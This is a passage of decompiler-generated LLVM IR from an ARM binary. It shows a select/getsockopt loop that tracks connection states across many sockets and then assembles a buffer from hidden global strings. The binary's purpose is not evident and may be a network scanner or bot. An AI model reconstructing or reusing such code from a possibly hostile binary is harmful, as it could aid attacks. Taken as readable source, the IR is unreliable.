  store i32 %v3_948c, i32* %r0.global-to-local, align 4
  %v0_9490 = load i32, i32* @r6, align 4
  %v1_9490 = add i32 %v0_9490, -1431
  %v2_9490 = inttoptr i32 %v1_9490 to i32*
  %v3_9490 = load i32, i32* %v2_9490, align 4
  store i32 %v3_9490, i32* %r0.global-to-local, align 4
  %v3_9498 = udiv i32 %v3_9490, 32
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  %v3_949c = mul nuw nsw i32 %v3_9498, 4
  store i32 %v3_949c, i32* %r3.global-to-local, align 4
  store i32 %v2_94a0, i32* %lr.global-to-local, align 4
  br label %dec_label_pc_94a8

dec_label_pc_94a8:                                ; preds = %dec_label_pc_9ad0, %dec_label_pc_9400
  %v1_94b4 = phi i32 [ %v3_9490, %dec_label_pc_9400 ], [ %v3_9ad0, %dec_label_pc_9ad0 ]
  %v3_949c.pn = phi i32 [ %v3_949c, %dec_label_pc_9400 ], [ %v3_9adc, %dec_label_pc_9ad0 ]
  %storemerge = add i32 %v3_949c.pn, %v2_94a0
  store i32 %storemerge, i32* %r3.global-to-local, align 4
  %v1_94a8 = add i32 %storemerge, -292
  %v2_94a8 = inttoptr i32 %v1_94a8 to i32*
  %v3_94a8 = load i32, i32* %v2_94a8, align 4
  %v1_94ac = urem i32 %v1_94b4, 32
  store i32 %v1_94ac, i32* %r1.global-to-local, align 4
  %v1_94b0 = load i32, i32* %fp.global-to-local, align 4
  %v7_94b0 = shl i32 %v1_94b0, %v1_94ac
  %v8_94b0 = or i32 %v7_94b0, %v3_94a8
  store i32 %v8_94b0, i32* %r2.global-to-local, align 4
  %v0_94b4 = load i32, i32* @sl, align 4
  %v2_94b4 = sub i32 %v0_94b4, %v1_94b4
  %v3_94b4 = icmp uge i32 %v0_94b4, %v1_94b4
  store i1 %v3_94b4, i1* %cpsr_c.global-to-local, align 1
  %v4_94b4 = xor i32 %v0_94b4, %v1_94b4
  %v5_94b4 = xor i32 %v2_94b4, %v0_94b4
  %v6_94b4 = and i32 %v5_94b4, %v4_94b4
  %v7_94b4 = icmp slt i32 %v6_94b4, 0
  store i1 %v7_94b4, i1* %cpsr_v.global-to-local, align 1
  %v8_94b4 = icmp slt i32 %v2_94b4, 0
  store i1 %v8_94b4, i1* %cpsr_n.global-to-local, align 1
  %v9_94b4 = icmp eq i32 %v0_94b4, %v1_94b4
  store i1 %v9_94b4, i1* %cpsr_z.global-to-local, align 1
  store i32 %v8_94b0, i32* %v2_94a8, align 4
  %v2_94bc = xor i1 %v8_94b4, %v7_94b4
  br i1 %v2_94bc, label %dec_label_pc_94c0, label %dec_label_pc_9388

dec_label_pc_94c0:                                ; preds = %dec_label_pc_94a8
  %v0_94c0 = load i32, i32* %r0.global-to-local, align 4
  %v1_94c0 = add i32 %v0_94c0, 1
  store i32 %v1_94c0, i32* @sl, align 4
  br label %dec_label_pc_94c4

dec_label_pc_94c4:                                ; preds = %dec_label_pc_9ab8, %dec_label_pc_9a80, %dec_label_pc_94c0
  %v0_94e499 = phi i32 [ %v1_9ab8, %dec_label_pc_9ab8 ], [ %v1_9a80, %dec_label_pc_9a80 ], [ %v1_94c0, %dec_label_pc_94c0 ]
  store i32 %v0_90f4, i32* %lr.global-to-local, align 4
  %v0_94c8 = load i32, i32* @r8, align 4
  %v1_94c8 = add i32 %v0_94c8, 1
  store i32 %v1_94c8, i32* @r8, align 4
  %v0_94cc = load i32, i32* @r7, align 4
  %v0_94d0 = load i32, i32* @r6, align 4
  %v2_94d4 = sub i32 %v0_90f4, %v1_94c8
  %v3_94d4 = icmp uge i32 %v0_90f4, %v1_94c8
  store i1 %v3_94d4, i1* %cpsr_c.global-to-local, align 1
  %v4_94d4 = xor i32 %v1_94c8, %v0_90f4
  %v5_94d4 = xor i32 %v2_94d4, %v0_90f4
  %v6_94d4 = and i32 %v5_94d4, %v4_94d4
  %v7_94d4 = icmp slt i32 %v6_94d4, 0
  store i1 %v7_94d4, i1* %cpsr_v.global-to-local, align 1
  %v8_94d4 = icmp slt i32 %v2_94d4, 0
  store i1 %v8_94d4, i1* %cpsr_n.global-to-local, align 1
  %v9_94d4 = icmp eq i32 %v0_90f4, %v1_94c8
  store i1 %v9_94d4, i1* %cpsr_z.global-to-local, align 1
  %v1_94d8 = add i32 %v0_94cc, 3140
  store i32 %v1_94d8, i32* @r7, align 4
  %v1_94dc = add i32 %v0_94d0, 3140
  store i32 %v1_94dc, i32* @r6, align 4
  br i1 %v9_94d4, label %dec_label_pc_94e4, label %dec_label_pc_93a8

dec_label_pc_94e4:                                ; preds = %dec_label_pc_94c4, %dec_label_pc_9388.dec_label_pc_94e4_crit_edge
  %v0_951c = phi i32 [ %v0_94e4.pre, %dec_label_pc_9388.dec_label_pc_94e4_crit_edge ], [ %v0_94e499, %dec_label_pc_94c4 ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_94e4 = icmp slt i32 %v0_951c, 0
  store i1 %v1_94e4, i1* %cpsr_n.global-to-local, align 1
  %v2_94e4 = icmp eq i32 %v0_951c, 0
  store i1 %v2_94e4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_94e4, label %dec_label_pc_9280, label %dec_label_pc_94ec

dec_label_pc_94ec:                                ; preds = %dec_label_pc_94e4
  store i32 %v10_9048, i32* %lr.global-to-local, align 4
  store i32 0, i32* @r5, align 4
  store i32 1, i32* %stack_var_-56, align 4
  store i32 %v2_950c, i32* %ip.global-to-local, align 4
  store i32 %v2_9510, i32* %r1.global-to-local, align 4
  store i32 %v2_9514, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 %v0_951c, i32* %r0.global-to-local, align 4
  %v13_9524 = call i32 @select(i32 %v0_951c, %_TYPEDEF_fd_set* %tmp209, %_TYPEDEF_fd_set* %tmp210, %_TYPEDEF_fd_set* null, %timeval* %tmp211)
  store i32 %v13_9524, i32* @r4, align 4
  %v0_952c = load i32, i32* @r5, align 4
  store i32 %v0_952c, i32* %r0.global-to-local, align 4
  %v1_9530 = inttoptr i32 %v0_952c to i32*
  %v2_9530 = call i32 @time(i32* %v1_9530)
  store i32 %v2_9530, i32* %r0.global-to-local, align 4
  %v0_9534 = load i32, i32* @r4, align 4
  %v1_9534 = load i32, i32* @r5, align 4
  %v2_9534 = sub i32 %v0_9534, %v1_9534
  %v3_9534 = icmp uge i32 %v0_9534, %v1_9534
  store i1 %v3_9534, i1* %cpsr_c.global-to-local, align 1
  %v4_9534 = xor i32 %v1_9534, %v0_9534
  %v5_9534 = xor i32 %v2_9534, %v0_9534
  %v6_9534 = and i32 %v5_9534, %v4_9534
  %v7_9534 = icmp slt i32 %v6_9534, 0
  store i1 %v7_9534, i1* %cpsr_v.global-to-local, align 1
  %v8_9534 = icmp slt i32 %v2_9534, 0
  store i1 %v8_9534, i1* %cpsr_n.global-to-local, align 1
  %v9_9534 = icmp eq i32 %v0_9534, %v1_9534
  store i1 %v9_9534, i1* %cpsr_z.global-to-local, align 1
  %v7_953c = icmp sgt i32 %v0_9534, %v1_9534
  br i1 %v7_953c, label %dec_label_pc_9540, label %dec_label_pc_9280

dec_label_pc_9540:                                ; preds = %dec_label_pc_94ec
  store i32 %stack_var_-20868.0.ph, i32* @r8, align 4
  br label %dec_label_pc_95b0

dec_label_pc_954c:                                ; preds = %.thread39.dec_label_pc_954c_crit_edge, %dec_label_pc_95c0
  %v0_9564 = phi i32 [ %v0_954c.pre, %.thread39.dec_label_pc_954c_crit_edge ], [ %v3_95b0, %dec_label_pc_95c0 ]
  %v3_954c = udiv i32 %v0_9564, 32
  store i32 %v2_94a0, i32* %r2.global-to-local, align 4
  %v3_9558 = mul nuw nsw i32 %v3_954c, 4
  %v2_955c = add i32 %v3_9558, %v2_94a0
  store i32 %v2_955c, i32* %r3.global-to-local, align 4
  %v1_9560 = add i32 %v2_955c, -164
  %v2_9560 = inttoptr i32 %v1_9560 to i32*
  %v3_9560 = load i32, i32* %v2_9560, align 4
  %v1_9564 = urem i32 %v0_9564, 32
  store i32 %v1_9564, i32* %r1.global-to-local, align 4
  %v2_9568 = add nsw i32 %v1_9564, -1
  %v3_9568 = shl i32 1, %v2_9568
  %v4_9568 = and i32 %v3_9568, %v3_9560
  %v5_9568 = icmp ne i32 %v4_9568, 0
  store i1 %v5_9568, i1* %cpsr_c.global-to-local, align 1
  %v6_9568 = lshr i32 %v3_9560, %v1_9564
  store i32 %v6_9568, i32* %r2.global-to-local, align 4
  %v1_956c = urem i32 %v6_9568, 2
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_956c = icmp eq i32 %v1_956c, 0
  store i1 %v2_956c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_956c, label %dec_label_pc_9590, label %dec_label_pc_9574

dec_label_pc_9574:                                ; preds = %dec_label_pc_954c
  %v0_9574 = load i32, i32* @r8, align 4
  %v1_9574 = add i32 %v0_9574, -1452
  %v2_9574 = inttoptr i32 %v1_9574 to i8*
  %v3_9574 = load i8, i8* %v2_9574, align 1
  %v4_9574 = zext i8 %v3_9574 to i32
  store i32 %v4_9574, i32* %r3.global-to-local, align 4
  %v2_9578 = icmp ugt i8 %v3_9574, 5
  store i1 %v2_9578, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v6_9578 = icmp ult i8 %v3_9574, 6
  store i1 %v6_9578, i1* %cpsr_n.global-to-local, align 1
  %v7_9578 = icmp eq i8 %v3_9574, 6
  store i1 %v7_9578, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_9578, label %dec_label_pc_9b28, label %dec_label_pc_9580

dec_label_pc_9580:                                ; preds = %dec_label_pc_9574
  %v2_9580 = icmp ugt i8 %v3_9574, 6
  store i1 %v2_9580, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v6_9580 = icmp ult i8 %v3_9574, 7
  store i1 %v6_9580, i1* %cpsr_n.global-to-local, align 1
  %v7_9580 = icmp eq i8 %v3_9574, 7
  store i1 %v7_9580, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_9580, label %dec_label_pc_a164, label %dec_label_pc_9588

dec_label_pc_9588:                                ; preds = %dec_label_pc_9580
  %v2_9588 = icmp ugt i8 %v3_9574, 9
  store i1 %v2_9588, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v6_9588 = icmp ult i8 %v3_9574, 10
  store i1 %v6_9588, i1* %cpsr_n.global-to-local, align 1
  %v7_9588 = icmp eq i8 %v3_9574, 10
  store i1 %v7_9588, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_9588, label %dec_label_pc_a374, label %dec_label_pc_9590

dec_label_pc_9590:                                ; preds = %dec_label_pc_a268, %dec_label_pc_a6a8, %dec_label_pc_a7f0, %dec_label_pc_a66c, %dec_label_pc_9588, %dec_label_pc_954c, %dec_label_pc_95b0, %dec_label_pc_aadc, %dec_label_pc_a88c, %dec_label_pc_a7d4, %dec_label_pc_a68c, %dec_label_pc_a654, %dec_label_pc_a5dc, %dec_label_pc_a3b4, %dec_label_pc_9634, %dec_label_pc_a158
  store i32 %v0_90f4, i32* %r3.global-to-local, align 4
  %v1_9598 = add i32 %stack_var_-20832.0, 1
  store i32 %v1_9598, i32* %r2.global-to-local, align 4
  %v0_959c = load i32, i32* @r8, align 4
  %v2_95a0 = sub i32 %v1_9598, %v0_90f4
  %v3_95a0 = icmp uge i32 %v1_9598, %v0_90f4
  store i1 %v3_95a0, i1* %cpsr_c.global-to-local, align 1
  %v4_95a0 = xor i32 %v1_9598, %v0_90f4
  %v5_95a0 = xor i32 %v2_95a0, %v1_9598
  %v6_95a0 = and i32 %v5_95a0, %v4_95a0
  %v7_95a0 = icmp slt i32 %v6_95a0, 0
  store i1 %v7_95a0, i1* %cpsr_v.global-to-local, align 1
  %v8_95a0 = icmp slt i32 %v2_95a0, 0
  store i1 %v8_95a0, i1* %cpsr_n.global-to-local, align 1
  %v9_95a0 = icmp eq i32 %v1_9598, %v0_90f4
  store i1 %v9_95a0, i1* %cpsr_z.global-to-local, align 1
  %v1_95a8 = add i32 %v0_959c, 3140
  store i32 %v1_95a8, i32* @r8, align 4
  br i1 %v9_95a0, label %dec_label_pc_9280, label %dec_label_pc_95b0

dec_label_pc_95b0:                                ; preds = %dec_label_pc_9590, %dec_label_pc_9540
  %v0_95b8 = phi i32 [ %stack_var_-20868.0.ph, %dec_label_pc_9540 ], [ %v1_95a8, %dec_label_pc_9590 ]
  %stack_var_-20832.0 = phi i32 [ %v1_9534, %dec_label_pc_9540 ], [ %v1_9598, %dec_label_pc_9590 ]
  %v1_95b0 = add i32 %v0_95b8, -1456
  %v2_95b0 = inttoptr i32 %v1_95b0 to i32*
  %v3_95b0 = load i32, i32* %v2_95b0, align 4
  store i32 %v3_95b0, i32* %r0.global-to-local, align 4
  %v1_95b4 = add i32 %v3_95b0, 1
  %v2_95b4 = icmp eq i32 %v3_95b0, -1
  store i1 %v2_95b4, i1* %cpsr_c.global-to-local, align 1
  %v3_95b4 = sub i32 0, %v3_95b0
  %v4_95b4 = and i32 %v1_95b4, %v3_95b4
  %v5_95b4 = icmp slt i32 %v4_95b4, 0
  store i1 %v5_95b4, i1* %cpsr_v.global-to-local, align 1
  %v6_95b4 = icmp slt i32 %v1_95b4, 0
  store i1 %v6_95b4, i1* %cpsr_n.global-to-local, align 1
  %v7_95b4 = icmp eq i32 %v1_95b4, 0
  store i1 %v7_95b4, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_95b0, i32* %sb.global-to-local, align 4
  br i1 %v7_95b4, label %dec_label_pc_9590, label %dec_label_pc_95c0

dec_label_pc_95c0:                                ; preds = %dec_label_pc_95b0
  %v3_95c0 = udiv i32 %v3_95b0, 32
  %v3_95c8 = mul nuw nsw i32 %v3_95c0, 4
  store i32 %v2_94a0, i32* %lr.global-to-local, align 4
  %v2_95d0 = add i32 %v3_95c8, %v2_94a0
  store i32 %v2_95d0, i32* %r3.global-to-local, align 4
  %v1_95d4 = add i32 %v2_95d0, -292
  %v2_95d4 = inttoptr i32 %v1_95d4 to i32*
  %v3_95d4 = load i32, i32* %v2_95d4, align 4
  %v1_95d8 = urem i32 %v3_95b0, 32
  store i32 %v1_95d8, i32* %r1.global-to-local, align 4
  %v2_95dc = add nsw i32 %v1_95d8, -1
  %v3_95dc = shl i32 1, %v2_95dc
  %v4_95dc = and i32 %v3_95d4, %v3_95dc
  %v5_95dc = icmp ne i32 %v4_95dc, 0
  store i1 %v5_95dc, i1* %cpsr_c.global-to-local, align 1
  %v6_95dc = lshr i32 %v3_95d4, %v1_95d8
  store i32 %v6_95dc, i32* %r2.global-to-local, align 4
  %v1_95e0 = urem i32 %v6_95dc, 2
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_95e0 = icmp eq i32 %v1_95e0, 0
  store i1 %v2_95e0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_95e0, label %dec_label_pc_954c, label %dec_label_pc_95e8

dec_label_pc_95e8:                                ; preds = %dec_label_pc_95c0
  store i32 4, i32* @r4, align 4
  store i32 %v10_9048, i32* %ip.global-to-local, align 4
  store i32 0, i32* @r5, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 %v2_9600, i32* %r3.global-to-local, align 4
  store i32 0, i32* %stack_var_-44, align 4
  store i32 4, i32* %stack_var_-48, align 4
  store i32 %v2_960c, i32* %lr.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  %v8_9618 = call i32 @getsockopt(i32 %v3_95b0, i32 1, i32 4, i32* nonnull %stack_var_-44, i32* nonnull %stack_var_-48)
  store i32 %v10_9048, i32* %r1.global-to-local, align 4
  %v3_9620 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_9620, i32* %r3.global-to-local, align 4
  %v2_9624 = or i32 %v3_9620, %v8_9618
  store i32 %v2_9624, i32* %r0.global-to-local, align 4
  %v3_9624 = icmp slt i32 %v2_9624, 0
  store i1 %v3_9624, i1* %cpsr_n.global-to-local, align 1
  %v4_9624 = icmp eq i32 %v2_9624, 0
  store i1 %v4_9624, i1* %cpsr_z.global-to-local, align 1
  br i1 %v4_9624, label %.thread39, label %dec_label_pc_9634

.thread39:                                        ; preds = %dec_label_pc_95e8
  %v1_9628 = load i32, i32* @r8, align 4
  %v2_9628 = add i32 %v1_9628, -1456
  %v3_9628 = inttoptr i32 %v2_9628 to i32*
  %v4_9628 = load i32, i32* %v3_9628, align 4
  store i32 %v4_9628, i32* %r0.global-to-local, align 4
  %v1_962c = load i32, i32* @r4, align 4
  %v2_962c = trunc i32 %v1_962c to i8
  %v4_962c = add i32 %v1_9628, -1452
  %v5_962c = inttoptr i32 %v4_962c to i8*
  store i8 %v2_962c, i8* %v5_962c, align 1
  %v0_9630.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_9630.pr.pr, label %.thread39.dec_label_pc_954c_crit_edge, label %dec_label_pc_9634

.thread39.dec_label_pc_954c_crit_edge:            ; preds = %.thread39
  %v0_954c.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_954c

dec_label_pc_9634:                                ; preds = %dec_label_pc_95e8, %.thread39
  %v0_9634 = load i32, i32* @r8, align 4
  %v1_9634 = add i32 %v0_9634, -1456
  %v2_9634 = inttoptr i32 %v1_9634 to i32*
  %v3_9634 = load i32, i32* %v2_9634, align 4
  store i32 %v3_9634, i32* %r0.global-to-local, align 4
  %v1_9638 = call i32 @close(i32 %v3_9634)
  store i32 -1, i32* %r0.global-to-local, align 4
  %v1_9640 = load i32, i32* @r8, align 4
  %v2_9640 = add i32 %v1_9640, -1456
  %v3_9640 = inttoptr i32 %v2_9640 to i32*
  store i32 -1, i32* %v3_9640, align 4
  %v0_9644 = load i32, i32* @r5, align 4
  %v1_9644 = trunc i32 %v0_9644 to i8
  %v2_9644 = load i32, i32* @r8, align 4
  %v3_9644 = add i32 %v2_9644, -1452
  %v4_9644 = inttoptr i32 %v3_9644 to i8*
  store i8 %v1_9644, i8* %v4_9644, align 1
  br label %dec_label_pc_9590

dec_label_pc_964c:                                ; preds = %dec_label_pc_93a8
  %v1_964c = add i32 %v3_9658, 25
  %v2_964c = inttoptr i32 %v1_964c to i32*
  %v3_964c = load i32, i32* %v2_964c, align 4
  store i32 %v3_964c, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_9650 = icmp slt i32 %v3_964c, 0
  store i1 %v1_9650, i1* %cpsr_n.global-to-local, align 1
  %v2_9650 = icmp eq i32 %v3_964c, 0
  store i1 %v2_9650, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_9650, label %.thread44, label %.thread42

.thread42:                                        ; preds = %dec_label_pc_964c
  store i32 4, i32* %r3.global-to-local, align 4
  store i8 4, i8* %v2_93a8, align 1
  %v0_965c.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_965c.pr.pr, label %.thread42..thread44_crit_edge, label %dec_label_pc_9664

.thread42..thread44_crit_edge:                    ; preds = %.thread42
  %v1_965c.pre = load i32, i32* %r3.global-to-local, align 4
  %v3_965c.pre = load i32, i32* @r6, align 4
  %extract.t = trunc i32 %v1_965c.pre to i8
  br label %.thread44

.thread44:                                        ; preds = %.thread42..thread44_crit_edge, %dec_label_pc_964c
  %v3_965c = phi i32 [ %v3_965c.pre, %.thread42..thread44_crit_edge ], [ %v3_9658, %dec_label_pc_964c ]
  %v1_965c.off0 = phi i8 [ %extract.t, %.thread42..thread44_crit_edge ], [ 0, %dec_label_pc_964c ]
  %v4_965c = add i32 %v3_965c, -1427
  %v5_965c = inttoptr i32 %v4_965c to i8*
  store i8 %v1_965c.off0, i8* %v5_965c, align 1
  %v0_9660.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_9660.pr, label %.thread44.dec_label_pc_93bc_crit_edge, label %dec_label_pc_9664

.thread44.dec_label_pc_93bc_crit_edge:            ; preds = %.thread44
  %v0_93bc.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_93bc

dec_label_pc_9664:                                ; preds = %.thread42, %.thread44, %dec_label_pc_9318
  store i32 -1, i32* %r3.global-to-local, align 4
  store i32 0, i32* @r5, align 4
  %v0_966c = load i32, i32* @r7, align 4
  %v1_966c = add i32 %v0_966c, 2112
  store i32 %v1_966c, i32* %r0.global-to-local, align 4
  %v1_9670 = load i32, i32* @r6, align 4
  %v2_9670 = add i32 %v1_9670, 33
  %v3_9670 = inttoptr i32 %v2_9670 to i32*
  store i32 -1, i32* %v3_9670, align 4
  %v0_9674 = load i32, i32* %r0.global-to-local, align 4
  %v1_9674 = add i32 %v0_9674, 4
  store i32 %v1_9674, i32* %r0.global-to-local, align 4
  store i32 1024, i32* %r1.global-to-local, align 4
  %v0_967c = load i32, i32* @r5, align 4
  %v1_967c = load i32, i32* @r6, align 4
  %v2_967c = add i32 %v1_967c, 21
  %v3_967c = inttoptr i32 %v2_967c to i32*
  store i32 %v0_967c, i32* %v3_967c, align 4
  %v2_9680 = call i32 @function_13a3c(i32 %v1_9674, i32 1024)
  store i32 10240, i32* %r1.global-to-local, align 4
  store i32 %stack_var_-20856.0.ph, i32* %r0.global-to-local, align 4
  %v0_968c = load i32, i32* @r5, align 4
  %v1_968c = load i32, i32* @r6, align 4
  %v2_968c = add i32 %v1_968c, 681
  %v3_968c = inttoptr i32 %v2_968c to i32*
  store i32 %v0_968c, i32* %v3_968c, align 4
  %v2_9690 = call i32 @function_13a3c(i32 %stack_var_-20856.0.ph, i32 10240)
  store i32 %stack_var_-20856.0.ph, i32* %r0.global-to-local, align 4
  %v2_9698 = call i32 @function_1399c(i8* %v1_9698)
  store i32 %stack_var_-20856.0.ph, i32* %r2.global-to-local, align 4
  %v0_96a0 = load i32, i32* @r6, align 4
  store i32 %v0_96a0, i32* %r1.global-to-local, align 4
  %v2_96a4 = add i32 %v2_9698, %stack_var_-20856.0.ph
  store i32 %v2_96a4, i32* @r0, align 4
  %v2_96a8 = inttoptr i32 %v2_96a4 to i8*
  %v3_96a8 = call i32 @function_139c4(i8* %v2_96a8, i32 %v0_96a0)
  store i32 %stack_var_-20856.0.ph, i32* %r0.global-to-local, align 4
  %v2_96b0 = call i32 @function_1399c(i8* %v1_9698)
  store i32 %stack_var_-20856.0.ph, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_142f4.82 to i32), i32* %r1.global-to-local, align 4
  %v2_96bc = add i32 %v2_96b0, %stack_var_-20856.0.ph
  store i32 %v2_96bc, i32* @r0, align 4
  %v2_96c0 = inttoptr i32 %v2_96bc to i8*
  %v3_96c0 = call i32 @function_139c4(i8* %v2_96c0, i32 ptrtoint (i32* @global_var_142f4.82 to i32))
  store i32 %stack_var_-20856.0.ph, i32* %r0.global-to-local, align 4
  %v2_96c8 = call i32 @function_1399c(i8* %v1_9698)
  store i32 %stack_var_-20856.0.ph, i32* %ip.global-to-local, align 4
  %v0_96d0 = load i32, i32* @r7, align 4
  %v1_96d0 = add i32 %v0_96d0, 532
  store i32 %v1_96d0, i32* %r1.global-to-local, align 4
  %v2_96d4 = add i32 %v2_96c8, %stack_var_-20856.0.ph
  store i32 %v2_96d4, i32* @r0, align 4
  %v2_96d8 = inttoptr i32 %v2_96d4 to i8*
  %v3_96d8 = call i32 @function_139c4(i8* %v2_96d8, i32 %v1_96d0)
  store i32 %stack_var_-20856.0.ph, i32* %r0.global-to-local, align 4
  %v2_96e0 = call i32 @function_1399c(i8* %v1_9698)
  store i32 %stack_var_-20856.0.ph, i32* %lr.global-to-local, align 4
  store i32 ptrtoint ([24 x i8]* @global_var_142cc.84 to i32), i32* %r1.global-to-local, align 4
  %v2_96ec = add i32 %v2_96e0, %stack_var_-20856.0.ph
  store i32 %v2_96ec, i32* @r0, align 4
  %v3_96f0 = inttoptr i32 %v2_96ec to i8*
  %v4_96f0 = call i32 @function_139c4(i8* %v3_96f0, i32 ptrtoint ([24 x i8]* @global_var_142cc.84 to i32))
  store i32 %stack_var_-20856.0.ph, i32* %r0.global-to-local, align 4
  %v2_96f8 = call i32 @function_1399c(i8* %v1_9698)
  %v2_9700 = add i32 %v2_96f8, %stack_var_-20856.0.ph
  store i32 %v2_9700, i32* @r0, align 4
  %v0_9704 = load i32, i32* @r7, align 4
  %v1_9704 = add i32 %v0_9704, 20
  store i32 %v1_9704, i32* %r1.global-to-local, align 4
  %v2_9708 = inttoptr i32 %v2_9700 to i8*
  %v3_9708 = call i32 @function_139c4(i8* %v2_9708, i32 %v1_9704)
  store i32 %stack_var_-20856.0.ph, i32* %r0.global-to-local, align 4
  %v2_9710 = call i32 @function_1399c(i8* %v1_9698)
  store i32 %stack_var_-20856.0.ph, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_142e4.86 to i32), i32* %r1.global-to-local, align 4
  %v2_971c = add i32 %v2_9710, %stack_var_-20856.0.ph
  store i32 %v2_971c, i32* @r0, align 4
  %v3_9720 = inttoptr i32 %v2_971c to i8*
  %v4_9720 = call i32 @function_139c4(i8* %v3_9720, i32 ptrtoint ([9 x i8]* @global_var_142e4.86 to i32))
  store i32 %stack_var_-20856.0.ph, i32* %r0.global-to-local, align 4
  %v2_9728 = call i32 @function_1399c(i8* %v1_9698)
  store i32 %stack_var_-20856.0.ph, i32* %r3.global-to-local, align 4
  %v0_9730 = load i32, i32* @r7, align 4
  %v2_9734 = add i32 %v2_9728, %stack_var_-20856.0.ph
  store i32 %v2_9734, i32* @r0, align 4
  %v1_9738 = add i32 %v0_9730, 789
  store i32 %v1_9738, i32* %r1.global-to-local, align 4
  %v2_973c = inttoptr i32 %v2_9734 to i8*
  %v3_973c = call i32 @function_139c4(i8* %v2_973c, i32 %v1_9738)
  store i32 %stack_var_-20856.0.ph, i32* %r0.global-to-local, align 4
  %v2_9744 = call i32 @function_1399c(i8* %v1_9698)
  store i32 %stack_var_-20856.0.ph, i32* %ip.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_142f0.88 to i32), i32* %r1.global-to-local, align 4
  %v2_9750 = add i32 %v2_9744, %stack_var_-20856.0.ph
  store i32 %v2_9750, i32* @r0, align 4
  %v2_9754 = inttoptr i32 %v2_9750 to i8*
  %v3_9754 = call i32 @function_139c4(i8* %v2_9754, i32 ptrtoint ([3 x i8]* @global_var_142f0.88 to i32))
  store i32 32, i32* %r0.global-to-local, align 4
  %v1_975c = call i32 @function_13074(i32 32)
  store i32 %stack_var_-20856.0.ph, i32* %r0.global-to-local, align 4
  %v2_9764 = call i32 @function_1399c(i8* %v1_9698)
  %v0_9768 = load i32, i32* @r5, align 4
  store i32 %v0_9768, i32* %r1.global-to-local, align 4
  store i32 %v2_9764, i32* @r4, align 4
  store i32 32, i32* %r0.global-to-local, align 4
  %v2_9774 = inttoptr i32 %v0_9768 to i32*
  %v3_9774 = call i32 @function_12f90(i32 32, i32* %v2_9774)
  store i32 %stack_var_-20856.0.ph, i32* %lr.global-to-local, align 4
  store i32 %v3_9774, i32* %r1.global-to-local, align 4
  %v1_9780 = load i32, i32* @r4, align 4
  %v2_9780 = add i32 %v1_9780, %stack_var_-20856.0.ph
  store i32 %v2_9780, i32* @r0, align 4
  %v2_9784 = inttoptr i32 %v2_9780 to i8*
  %v3_9784 = call i32 @function_139c4(i8* %v2_9784, i32 %v3_9774)
  store i32 32, i32* %r0.global-to-local, align 4
  %v1_978c = call i32 @function_12fbc(i32 32)
  store i32 %stack_var_-20856.0.ph, i32* %r0.global-to-local, align 4
  %v2_9794 = call i32 @function_1399c(i8* %v1_9698)
  %v2_979c = add i32 %v2_9794, %stack_var_-20856.0.ph
  store i32 %v2_979c, i32* @r0, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_142f0.88 to i32), i32* %r1.global-to-local, align 4
  %v2_97a4 = inttoptr i32 %v2_979c to i8*
  %v3_97a4 = call i32 @function_139c4(i8* %v2_97a4, i32 ptrtoint ([3 x i8]* @global_var_142f0.88 to i32))
  store i32 33, i32* %r0.global-to-local, align 4
  %v1_97ac = call i32 @function_13074(i32 33)
  store i32 %stack_var_-20856.0.ph, i32* %r0.global-to-local, align 4
  %v2_97b4 = call i32 @function_1399c(i8* %v1_9698)
  %v0_97b8 = load i32, i32* @r5, align 4
  store i32 %v0_97b8, i32* %r1.global-to-local, align 4
  store i32 %v2_97b4, i32* @r4, align 4
  store i32 33, i32* %r0.global-to-local, align 4
  %v2_97c4 = inttoptr i32 %v0_97b8 to i32*
  %v3_97c4 = call i32 @function_12f90(i32 33, i32* %v2_97c4)
  store i32 %stack_var_-20856.0.ph, i32* %r2.global-to-local, align 4
  store i32 %v3_97c4, i32* %r1.global-to-local, align 4
  %v1_97d0 = load i32, i32* @r4, align 4
  %v2_97d0 = add i32 %v1_97d0, %stack_var_-20856.0.ph
  store i32 %v2_97d0, i32* @r0, align 4
  %v2_97d4 = inttoptr i32 %v2_97d0 to i8*
  %v3_97d4 = call i32 @function_139c4(i8* %v2_97d4, i32 %v3_97c4)
  store i32 33, i32* %r0.global-to-local, align 4
  %v1_97dc = call i32 @function_12fbc(i32 33)
  store i32 %stack_var_-20856.0.ph, i32* %r0.global-to-local, align 4
  %v2_97e4 = call i32 @function_1399c(i8* %v1_9698)
  store i32 %stack_var_-20856.0.ph, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_142f0.88 to i32), i32* %r1.global-to-local, align 4
  %v2_97f0 = add i32 %v2_97e4, %stack_var_-20856.0.ph
  store i32 %v2_97f0, i32* @r0, align 4
